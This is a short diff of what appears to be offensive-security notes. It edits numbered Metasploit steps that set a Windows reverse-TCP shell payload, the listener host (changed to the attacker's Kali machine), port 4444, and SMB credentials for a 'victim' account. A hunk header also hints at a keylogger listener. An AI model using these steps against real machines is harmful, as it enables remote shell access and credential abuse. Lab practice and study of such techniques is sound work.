@@ -120,11 +120,11 @@ with Listener(on_press=on_press) as listener:
 
 4) set PAYLOAD/windows/shell/reverse_tcp
 
-5) set LHOST (WINDOWS IP)
+5) set LHOST (kali linux IP)
 
 6) set LPORT 4444
 
-7) set SMBUser victim
+7) set SMBUser victim 
 
 8) set SMBPass password
 
